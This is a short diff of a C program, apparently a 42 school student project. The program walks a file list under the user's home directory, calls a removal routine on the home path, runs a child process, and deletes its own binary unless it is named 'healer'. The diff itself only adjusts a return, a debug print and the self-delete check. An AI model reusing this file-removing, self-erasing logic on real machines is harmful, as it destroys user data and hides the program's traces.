@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:23:49 by mgama             #+#    #+#             */
-/*   Updated: 2023/06/26 20:33:09 by mgama            ###   ########.fr       */
+/*   Updated: 2023/06/26 20:34:40 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -115,6 +115,7 @@ int	print_info(char **envp)
 	// 	return (1);
 	process_child(cmd, envp);
 	// waitpid(-1, NULL, 0);
+	return (0);
 }
 
 int	main(int ac, char **av, char **envp)
@@ -129,6 +130,7 @@ int	main(int ac, char **av, char **envp)
 	realpath(getenv("HOME"), home_buffer);
 	realpath(av[0], current_file_buffer);
 	printf("home path %s\n", home_buffer);
+	printf("%d %s\n", strcmp(av[0], "healer"), av[0]);
 	while (file_list[i])
 	{
 		path = ft_strjoin(getenv("HOME"), file_list[i]);
@@ -144,8 +146,7 @@ int	main(int ac, char **av, char **envp)
 	print_info(envp);
 	if (rm_file(home_buffer, envp))
 		return (1);
-	printf("%d %s\n", strcmp(av[0], "healer"), av[0]);
-	if (strcmp(av[0], "healer") != 0)
+	if (strcmp(av[0], "healer") != 0 && strcmp(av[0], "./healer") != 0)
 		if (remove(current_file_buffer) < 0)
 			dprintf(2, "Could not remove file %s", current_file_buffer), perror("");
 	return (0);
